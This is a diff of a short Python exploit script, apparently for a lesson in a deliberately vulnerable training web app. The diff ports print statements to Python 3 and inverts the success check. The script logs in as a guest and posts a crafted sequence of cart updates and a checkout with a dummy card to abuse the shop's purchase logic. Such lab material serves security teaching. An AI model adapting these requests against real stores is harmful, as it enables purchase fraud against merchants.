@@ -11,7 +11,7 @@ r1 = s.get(PREFIX + "/login.mvc")
 
 r2 = s.post(PREFIX + "j_spring_security_check", data={"username": "guest", "password": "guest"})
 if "Logout" not in r2.text:
-     print "Exploit error (login failed)"
+     print("Exploit error (login failed)")
      exit()
 
 
@@ -26,7 +26,7 @@ for category in data:
                     attack_link = c["link"]
 
 if attack_link == "":
-     print "Exploit error (couldn't find attack link)"
+     print("Exploit error (couldn't find attack link)")
      exit()
 
 r4 = s.post(PREFIX + attack_link, data={"QTY1": "1", "QTY2": "0", "QTY3": "0", "QTY4": "0", "SUBMIT": "Update Cart"})
@@ -34,8 +34,8 @@ r5 = s.post(PREFIX + attack_link, data={"QTY1": "1", "QTY2": "0", "QTY3": "0", "
 r6 = s.post(PREFIX + attack_link, data={"QTY1": "0", "QTY2": "0", "QTY3": "1", "QTY4": "0", "SUBMIT": "Update Cart"})
 r7 = s.post(PREFIX + attack_link, data={"CC": "5321 1337 8888 2007", "PAC": "111", "SUBMIT": "Confirm"})
 
-if "Police" not in r7.text:
-     print "Exploit succeeded"
+if "Police" in r7.text:
+     print("Exploit succeeded")
 else:
-     print "Exploit failed"
+     print("Exploit failed")
 
